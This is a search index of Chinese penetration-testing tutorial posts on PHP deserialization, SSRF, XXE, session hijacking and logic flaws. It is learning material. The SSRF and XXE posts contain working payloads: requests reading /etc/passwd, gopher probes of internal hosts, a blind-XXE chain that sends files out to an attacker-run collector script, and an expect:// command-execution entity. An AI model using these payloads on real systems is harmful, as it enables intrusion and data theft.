<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>PHP反序列化漏洞</title>
      <link href="/2020/09/01/%E9%98%B6%E6%AE%B5%E5%9B%9B%E3%80%81Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/17%E3%80%81PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2020/09/01/%E9%98%B6%E6%AE%B5%E5%9B%9B%E3%80%81Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/17%E3%80%81PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h2><h3 id="一、PHP反序列化漏洞原理"><a href="#一、PHP反序列化漏洞原理" class="headerlink" title="一、PHP反序列化漏洞原理"></a>一、PHP反序列化漏洞原理</h3><p>PHP反序列化漏洞：执行unserialize()时，先会调用__wakeup()。</p><p>当序列化字符串中属性值个数大于属性个数，就会导致反序列化异常，从而跳过__wakeup()。</p><h3 id="二、反序列化的例子与格式"><a href="#二、反序列化的例子与格式" class="headerlink" title="二、反序列化的例子与格式"></a>二、反序列化的例子与格式</h3><h3 id="序列化格式"><a href="#序列化格式" class="headerlink" title="序列化格式"></a>序列化格式</h3><p>在PHP中，序列化用于存储或传递 PHP 的值的过程中，同时不丢失其类型和结构。</p><p>序列化函数原型如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> serialize ( mixed $value )</span><br></pre></td></tr></table></figure><p>先看下面的例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CC</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $data;</span><br><span class="line">    <span class="keyword">private</span> $pass;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$data, $pass</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = $data;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pass = $pass;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$number = <span class="number">34</span>;</span><br><span class="line">$str = <span class="string">&#x27;uusama&#x27;</span>;</span><br><span class="line">$bool = <span class="literal">true</span>;</span><br><span class="line">$null = <span class="literal">NULL</span>;</span><br><span class="line">$arr_int = <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span> =&gt; <span class="number">1</span>, <span class="string">&#x27;b&#x27;</span> =&gt; <span class="number">2</span>);</span><br><span class="line">$cc = <span class="keyword">new</span> CC(<span class="string">&#x27;uu&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">var_dump(serialize($number));</span><br><span class="line">var_dump(serialize($str));</span><br><span class="line">var_dump(serialize($bool));</span><br><span class="line">var_dump(serialize($null));</span><br><span class="line">var_dump(serialize($arr_int));</span><br><span class="line">var_dump(serialize($arr));</span><br><span class="line">var_dump(serialize($cc));</span><br></pre></td></tr></table></figure><p>输出结果为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;i:34;&quot;</span></span><br><span class="line"><span class="keyword">string</span>(<span class="number">13</span>) <span class="string">&quot;s:6:&quot;</span>uusama<span class="string">&quot;;&quot;</span></span><br><span class="line"><span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;b:1;&quot;</span></span><br><span class="line"><span class="keyword">string</span>(<span class="number">2</span>) <span class="string">&quot;N;&quot;</span></span><br><span class="line"><span class="keyword">string</span>(<span class="number">22</span>) <span class="string">&quot;a:2:&#123;i:0;i:1;i:1;i:2;&#125;&quot;</span> </span><br><span class="line"><span class="keyword">string</span>(<span class="number">30</span>) <span class="string">&quot;a:2:&#123;s:1:&quot;</span>a<span class="string">&quot;;i:1;s:1:&quot;</span><span class="string">b&quot;;i:2;&#125;&quot;</span></span><br><span class="line"><span class="keyword">string</span>(<span class="number">52</span>) <span class="string">&quot;O:2:&quot;</span>CC<span class="string">&quot;:2:&#123;s:4:&quot;</span>data<span class="string">&quot;;s:2:&quot;</span>uu<span class="string">&quot;;s:8:&quot;</span> CC pass<span class="string">&quot;;b:1;&#125;&quot;</span></span><br></pre></td></tr></table></figure><p>所以序列化对于不同类型得到的字符串格式为：</p><ul><li><code>String</code> : s:size:value;</li><li><code>Integer</code> : i:value;</li><li><code>Boolean</code> : b:value;(保存1或0)</li><li><code>Null</code> : N;</li><li><code>Array</code> : a:size:{key definition;value definition;(repeated per element)}</li><li><code>Object</code> : O:strlen(object name):object name:object  size:{s:strlen(property name):property name:property  definition;(repeated per property)}</li></ul>]]></content>
      
      
      <categories>
          
          <category> Web渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF漏洞</title>
      <link href="/2020/09/01/%E9%98%B6%E6%AE%B5%E5%9B%9B%E3%80%81Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/16%E3%80%81SSRF/"/>
      <url>/2020/09/01/%E9%98%B6%E6%AE%B5%E5%9B%9B%E3%80%81Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/16%E3%80%81SSRF/</url>
      
        <content type="html"><![CDATA[<h2 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h2><h3 id="一、什么是SSRF漏洞"><a href="#一、什么是SSRF漏洞" class="headerlink" title="一、什么是SSRF漏洞"></a>一、什么是SSRF漏洞</h3><p>​    SSRF，Server-Side Request Forgery，服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。</p><p>​    漏洞形成的原因大多是因为服务端提供了向其他服务器应用请求获取数据的功能，但却没有对目标地址作过滤和限制。</p><p>攻击者可以利用 SSRF 实现的攻击主要有 5 种：</p><ol><li>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的 banner 信息</li><li>攻击运行在内网或本地的应用程序（比如溢出）</li><li>对内网 WEB 应用进行指纹识别，通过访问默认文件实现</li><li>攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击（比如 Struts2，sqli 等）</li><li>利用 <code>file</code>、<code>gopher</code>、<code>dict</code> 协议读取本地文件、执行命令等</li></ol><h3 id="二、SSRF漏洞支持的协议"><a href="#二、SSRF漏洞支持的协议" class="headerlink" title="二、SSRF漏洞支持的协议"></a>二、SSRF漏洞支持的协议</h3><p>对于不同语言实现的web系统可以使用的协议也存在不同的差异，其中:<br>    <strong>php</strong>：http、https、file、gopher、phar、dict、ftp、ssh、telnet…<br>    <strong>java</strong>：http、https、file、ftp、jar、netdoc、mailto..</p><h3 id="三、SSRF漏洞示例"><a href="#三、SSRF漏洞示例" class="headerlink" title="三、SSRF漏洞示例"></a>三、SSRF漏洞示例</h3><p>1、假设一个漏洞场景:某网站有一个在线加载功能可以把指定的远程图片加载到本地，功<br>能链接如下:<br><a href="wwW.xxX.comla.php?image=http://www.abc.com/1.jpg">wwW.xxX.comla.php?image=http://www.abc.com/1.jpg</a><br>那么网站请求的大概步骤应该是类似以下:<br>用户输入图片地址-&gt;请求发送到服务端解析-&gt;服务端请求链接地址的图片数据-&gt;获取请求<br>的数据加载到前台显示。</p><p><u>我们可以利用这个漏洞进行攻击尝试：</u></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www.xxx.com?a.php?image&#x3D;http:&#x2F;&#x2F;192.168.100.130:8080</span><br><span class="line">www.xxx.com?a.php?image&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br><span class="line">www.xxx.com?a.php?image&#x3D;gopher:&#x2F;&#x2F;192.168.100.130:6666&#x2F;_test</span><br></pre></td></tr></table></figure><p>2、百度翻译这个网页执行了本身的翻译服务，而搜索IP也执行了他本身的搜索服务，这样<br>百度翻译就把自己的IP发送给<a href="http://www.ip138.com这个网址,ip翻译出来的结果就是百度翻译服务器所在的外网ip./">www.ip138.com这个网址，IP翻译出来的结果就是百度翻译服务器所在的外网IP。</a></p><p><a href="https://imgchr.com/i/djoxzj"><img src="https://s1.ax1x.com/2020/09/01/djoxzj.png" alt="djoxzj.png"></a></p><p>3、腾讯微博应用http:/lshare.xx.x.qq.com SSRF利用点，参数: url<br><a href="http://share.xx.x.qq.com/index.php?c=share&amp;a=pageinfo&amp;url=http://wuyun.org">http://share.xx.x.qq.com/index.php?c=share&amp;a=pageinfo&amp;url=http://wuyun.org</a><br>请求远程服务器的22端口，直接回显OpenSSH的banner信息</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Payload</span></span><br><span class="line">[root@localhost wyssrf]<span class="comment"># curl &quot;http//share.xx.x.qq.com/index.php?c=share&amp;a=pageinfo&amp;url=http://fuzz.wuyun.org:22&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#返回</span></span><br><span class="line">&#123;<span class="string">&quot;ret&quot;</span>:0,<span class="string">&quot;data&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:1,<span class="string">&quot;title&quot;</span>:<span class="string">&quot;SSH-2.0-OpenSSH_5.3.….&quot;</span><span class="string">&quot;&#125;</span></span><br></pre></td></tr></table></figure><h3 id="四、SSRF漏洞常见场景"><a href="#四、SSRF漏洞常见场景" class="headerlink" title="四、SSRF漏洞常见场景"></a>四、SSRF漏洞常见场景</h3><p>1、通过URL地址加载或下载图片<br><a href="http://image.xx.com/image.php?image=http://tupian.baidu.com/2.jpg">http://image.xx.com/image.php?image=http://tupian.baidu.com/2.jpg</a><br>图片加载存在于很多的编辑器中，编辑器上传图片处，有的是加载远程图片到服务器内。<br>还有一些采用了加载远程图片的形式，本地文章加载了设定好的远程图片服务器上的图<br>片地址，如果没对加载的参数做限制可能造成SSRF。</p>]]></content>
      
      
      <categories>
          
          <category> Web渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE漏洞</title>
      <link href="/2020/08/28/%E9%98%B6%E6%AE%B5%E5%9B%9B%E3%80%81Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/15%E3%80%81XXE/"/>
      <url>/2020/08/28/%E9%98%B6%E6%AE%B5%E5%9B%9B%E3%80%81Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/15%E3%80%81XXE/</url>
      
        <content type="html"><![CDATA[<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><h3 id="一、XXE漏洞的定义"><a href="#一、XXE漏洞的定义" class="headerlink" title="一、XXE漏洞的定义"></a>一、XXE漏洞的定义</h3><p>​    XXE漏洞全称XML External Entity Injection，即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。</p><h3 id="二、什么是XML"><a href="#二、什么是XML" class="headerlink" title="二、什么是XML"></a>二、什么是XML</h3><p>​    XML是一种可扩展的标记语言，主要用于传输数据。XML文档结构包括XML声明、 {DTD文档类型定义（可选）}、文档元素。</p><p><img src="C:\Users\18265\AppData\Roaming\Typora\typora-user-images\image-20200828161448243.png" alt="image-20200828161448243"></p><h3 id="三、什么是DTD"><a href="#三、什么是DTD" class="headerlink" title="三、什么是DTD"></a>三、什么是<strong>DTD</strong></h3><p>​    DTD（文档类型定义）定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD有两种声明方式：</p><p>1、内部 dtd：即对 XML 文档中的元素、属性和实体的 DTD 的声明都在 XML 文档中。</p><p>2、外部 dtd：即对 XML 文档中的元素、属性和实体的 DTD 的声明都在一个独立的DTD 文件（.dtd）中。</p><p>格式：</p><p>（1）内部声明</p><p><code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></p><p>（2）外部声明</p><p><code>&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</code></p><h3 id="四、使用内部和外部DTD的XML实力"><a href="#四、使用内部和外部DTD的XML实力" class="headerlink" title="四、使用内部和外部DTD的XML实力"></a>四、使用内部和外部DTD的XML实力</h3><p>1、内部DTD的XML</p><p><img src="C:\Users\18265\AppData\Roaming\Typora\typora-user-images\image-20200828161727933.png" alt="image-20200828161727933"></p><p>2、外部DTD的XML</p><p><img src="C:\Users\18265\AppData\Roaming\Typora\typora-user-images\image-20200828161741540.png" alt="image-20200828161741540"></p><h3 id="五、XXE漏洞详解"><a href="#五、XXE漏洞详解" class="headerlink" title="五、XXE漏洞详解"></a>五、XXE漏洞详解</h3><p>XXE漏洞即XML外部实体注入，分别理解一下注入和外部实体的含义。</p><p><strong>注入：</strong>是指XML数据在传输过程中被修改，导致服务器执行了修改后的恶意代码，从而达到</p><p>攻击目的。</p><p><strong>外部实体：</strong>则是指攻击者通过利用外部实体声明部分来对XML数据进行修改、插入恶意代码。</p><p>因此XXE漏洞就是指XML数据在传输过程中利用外部实体声明部分的”SYSTEM”或者”PUBLIC”关键词导致XML解析器可以从本地文件或者远程URI中读取数据</p><h3 id="六、三种典型攻击手法"><a href="#六、三种典型攻击手法" class="headerlink" title="六、三种典型攻击手法"></a>六、三种典型攻击手法</h3><p>1、通过DTD外部实体声明</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">wang</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY a <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">aaa</span>&gt;</span><span class="symbol">&amp;a;</span><span class="tag">&lt;/<span class="name">aaa</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2、通过DTD文档引入外部DTD文档，再引入外部实体声明</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">wang</span> <span class="meta-keyword">SYSTEM</span> </span></span><br><span class="line"><span class="meta"><span class="meta-string">&quot;http://192.168.100.130/xxe/2.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">aaa</span>&gt;</span><span class="symbol">&amp;f;</span><span class="tag">&lt;/<span class="name">aaa</span>&gt;</span></span><br><span class="line">DTD文件内容：</span><br><span class="line"><span class="meta">&lt;!ENTITY f <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///c://key.txt&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>3、通过DTD外部参数实体声明引入外部实体文档，在引入外部实体声明</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> </span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&quot;http://192.168.100130/xxe/2.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%file;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">aaa</span>&gt;</span><span class="symbol">&amp;f;</span><span class="tag">&lt;/<span class="name">aaa</span>&gt;</span></span><br><span class="line">外部实体声明内容：</span><br><span class="line"><span class="meta">&lt;!ENTITY f <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///c://key.txt&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="七、不同语言支持的XML注入协议"><a href="#七、不同语言支持的XML注入协议" class="headerlink" title="七、不同语言支持的XML注入协议"></a>七、不同语言支持的XML注入协议</h3><p><img src="C:\Users\18265\AppData\Roaming\Typora\typora-user-images\image-20200828164152886.png" alt="image-20200828164152886"></p><h3 id="八、常见注入结果"><a href="#八、常见注入结果" class="headerlink" title="八、常见注入结果"></a>八、常见注入结果</h3><p>1、正常回显XXE</p><p>正常回显XXE是最传统的XXE攻击,在利用过程中服务器会直接回显信息，可直接完成XXE攻击。</p><p>2、报错XXE</p><p>报错XXE是回显XXE攻击的一种特例,它与正常回显XXE的不同在于它在利用过程中服务器回显的是错误信息，可根据错误信息去分辨可利用的信息。</p><p>3、Blind XXE</p><p>当服务器没有回显，使用Blind XXE。Blind XXE主要使用了参数实体进行嵌套定义。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;192.168.100.130&#x2F;xxe&#x2F;1.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;c:&#x2F;xxe.txt&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br><span class="line">1.dtd的内容</span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;192.168.100.130&#x2F;xxe&#x2F;Get_Xxe.php?file&#x3D;%file;&#39;&gt;&quot;&gt;</span><br><span class="line">%all;</span><br><span class="line">Get_Xxe.php的内容</span><br><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;简单的把GET过来的请求追加的保存在本地1.txt文件下</span><br><span class="line">$txt &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">if($txt)</span><br><span class="line">&#123;</span><br><span class="line">    $file &#x3D; fopen( &quot;1.txt&quot; , &quot;a+&quot;);</span><br><span class="line">    fwrite($file, &quot;$txt&quot;. &quot;\r\n&quot;);</span><br><span class="line">    print($txt);</span><br><span class="line">    fclose($file);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="九、XXE的利用"><a href="#九、XXE的利用" class="headerlink" title="九、XXE的利用"></a>九、XXE的利用</h3><h4 id="1、任意文件读取"><a href="#1、任意文件读取" class="headerlink" title="1、任意文件读取"></a>1、任意文件读取</h4><h4 id="2、XXE-RCE"><a href="#2、XXE-RCE" class="headerlink" title="2、XXE-RCE"></a>2、XXE-RCE</h4><p>​    XXE也能RCE 。但是，需要在特定场景下。当PHP安装了expect （PHP是不默认安装扩展），一旦安装了这个 expect 扩展我们就能直接利用 XXE 进行 RCE 。<br>示例代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">cmd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;expect://id&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dir</span>&gt;</span><span class="tag">&lt;<span class="name">file</span>&gt;</span><span class="symbol">&amp;cmd;</span><span class="tag">&lt;/<span class="name">file</span>&gt;</span><span class="tag">&lt;/<span class="name">dir</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="3、端口探测"><a href="#3、端口探测" class="headerlink" title="3、端口探测"></a>3、端口探测</h4><p>XXE由于可以访问URL，也就有类似SSRF的攻击效果，同样的，也可以利用XXE来进行内网端口探测。</p><p><img src="C:\Users\18265\AppData\Roaming\Typora\typora-user-images\image-20200828170600284.png" alt="image-20200828170600284"></p><p><img src="C:\Users\18265\AppData\Roaming\Typora\typora-user-images\image-20200828170610948.png" alt="image-20200828170610948"></p><h4 id="4、JSON-XXE"><a href="#4、JSON-XXE" class="headerlink" title="4、JSON XXE"></a>4、JSON XXE</h4><p>​    正如我们所知道的，很多web和移动应用都基于客户端-服务器交互模式的web通信<br>服务。一般对于web服务来说，最常见的数据格式都是XML和JSON。尽管web服务<br>可能在编程时只使用其中一种格式，但服务器却可以接受开发人员并没有预料到的<br>其他数据格式，这就有可能会导致JSON节点受到XXE（XML外部实体）攻击。</p>]]></content>
      
      
      <categories>
          
          <category> Web渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>会话安全（Session Security）</title>
      <link href="/2020/08/28/%E9%98%B6%E6%AE%B5%E5%9B%9B%E3%80%81Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/14%E3%80%81%E4%BC%9A%E8%AF%9D%E5%AE%89%E5%85%A8%EF%BC%88Session%20Security%EF%BC%89/"/>
      <url>/2020/08/28/%E9%98%B6%E6%AE%B5%E5%9B%9B%E3%80%81Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/14%E3%80%81%E4%BC%9A%E8%AF%9D%E5%AE%89%E5%85%A8%EF%BC%88Session%20Security%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="会话安全（Session-Security）"><a href="#会话安全（Session-Security）" class="headerlink" title="会话安全（Session Security）"></a>会话安全（Session Security）</h2><h3 id="一、为什么需要会话"><a href="#一、为什么需要会话" class="headerlink" title="一、为什么需要会话"></a>一、为什么需要会话</h3><p>​    一般在TCP三次握手就创建一个会话，在会话中可以传递信息，等TCP关闭连接就关闭会话。且HTTP协议是基于TCP协议的，所以HTTP会话也会关闭会话，而在HTTP1.1中，一个连接就只能处理一个请求，所以在需要权限身份认证的时候就需要有一种身份标识。</p><h3 id="二、有关会话的安全隐患"><a href="#二、有关会话的安全隐患" class="headerlink" title="二、有关会话的安全隐患"></a>二、有关会话的安全隐患</h3><p>1、信息泄露</p><p>​    Cookie的主要功能是实现用户个人信息的索引值记录，服务器中对应索引值的Session中存储了大量用户的信息，如身份id，浏览次数，手机号，等一些隐私信息，它最根本的用途是帮助Web站点保存有关访问者的信息，可是一旦泄露了Cookie，除了会产生信息泄露，攻击者也可以通过用户身份登录，这是非常大的隐患。</p><p>2、越权操作</p><p>​    在cookie的身份认证中，极容易造成越权，且大多数越权修改参数都是在Cookie这个字段进行修改，大多数cookie中会有用户的身份标识ID，如果未合理的处理或者多重认证，很容易造成越权。</p><h3 id="三、Session劫持"><a href="#三、Session劫持" class="headerlink" title="三、Session劫持"></a>三、Session劫持</h3><p>​    Session劫持就是自己的PHPSESSID被攻击者以某种方式获取，然后在会话的有效期内，利用被攻击者的身份登录网站，来达到身份劫持，伪装成合法用户。Session成功劫持一般需要几个步骤，</p><p>1、用户访问的平台是使用session来进行身份认证。</p><p>2、用户已经使用账号密码登录该平台，随即该用户会得到一个sessionid。</p><p>3、通过劫持获取到sessionid，并且在sessionid的有效期内使用（未注销前）</p><h3 id="四、Session劫持的方法"><a href="#四、Session劫持的方法" class="headerlink" title="四、Session劫持的方法"></a>四、Session劫持的方法</h3><p>如何获得sessionid是关键</p><h4 id="1、会话爆破："><a href="#1、会话爆破：" class="headerlink" title="1、会话爆破："></a>1、会话爆破：</h4><p>尝试各种Session ID，直到破解为止；</p><blockquote><p>PHPSESSID生成规则是根据hash_func散列来生成的，相关的参数有：</p><ul><li><p>客户端IP</p></li><li><p>当前时间（秒）</p></li><li><p>当前时间（微秒）</p></li><li><p>PHP自带的随机数生产器</p></li></ul></blockquote><h4 id="2、会话劫持："><a href="#2、会话劫持：" class="headerlink" title="2、会话劫持："></a>2、会话劫持：</h4><p>​    会话劫持（Session hijacking），是一种通过获取用户Session ID后，使用该Session ID登</p><p>录目标账号的攻击方法，此时攻击者实际上是使用了目标账户的有效Session。</p><p>​    利用xss反弹到的cookie，来伪造身份登录。即可利用管理员的session来登录，前提是</p><p>必须在会话有效期内使用。或者利用任意文件读取，XXE漏洞等其他漏洞来进行读取文</p><p>件来获取sessionid，服务端保存的都是在有效期内的session。</p><h4 id="3、会话预测："><a href="#3、会话预测：" class="headerlink" title="3、会话预测："></a>3、会话预测：</h4><p>​    如果Session ID使用非随机的方式产生，那么就有可能计算出来；</p><p>​    预测这种方式，也就是攻击者需要猜测出系统中使用的有效的session标识符，有点类似</p><p>暴力破解。</p><h4 id="4、会话固定："><a href="#4、会话固定：" class="headerlink" title="4、会话固定："></a>4、会话固定：</h4><p>​    会话固定（Session fixation）是一种诱骗受害者使用攻击者指定的会话标识（SessionID）的攻击手段。这是攻击者获取合法会话标识的最简单的方法。让合法用户使用黑客预先设置的sessionID进行登录，从而是Web不再进行生成新的sessionID，从而导致黑客设置的sessionId变成了合法桥梁。</p><p>​    让合法用户使用黑客预先设置的sessionID进行登录，从而是Web不再进行生成新的sessionID（运气好有可能）</p>]]></content>
      
      
      <categories>
          
          <category> Web渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逻辑漏洞</title>
      <link href="/2020/08/26/%E9%98%B6%E6%AE%B5%E5%9B%9B%E3%80%81Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/13%E3%80%81%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/08/26/%E9%98%B6%E6%AE%B5%E5%9B%9B%E3%80%81Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/13%E3%80%81%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h2><h3 id="一、逻辑漏洞的定义"><a href="#一、逻辑漏洞的定义" class="headerlink" title="一、逻辑漏洞的定义"></a>一、逻辑漏洞的定义</h3><p>​    逻辑错误漏洞是指由于程序逻辑不严谨或逻辑太复杂，导致一些逻辑分支不能够以正常流程处理业务。根据不同的场景所产生的危害也不同。例如任意查询&amp;删除用户信息、验证码暴破、任意用户密码重置、交易支付、<u>越权访问</u>等等。</p><p><a href="https://imgchr.com/i/dRHh4g"><img src="https://s1.ax1x.com/2020/08/26/dRHh4g.png" alt="dRHh4g.png"></a></p><h3 id="二、逻辑漏洞的分类"><a href="#二、逻辑漏洞的分类" class="headerlink" title="二、逻辑漏洞的分类"></a>二、逻辑漏洞的分类</h3>]]></content>
      
      
      <categories>
          
          <category> Web渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>不安全的URL跳转</title>
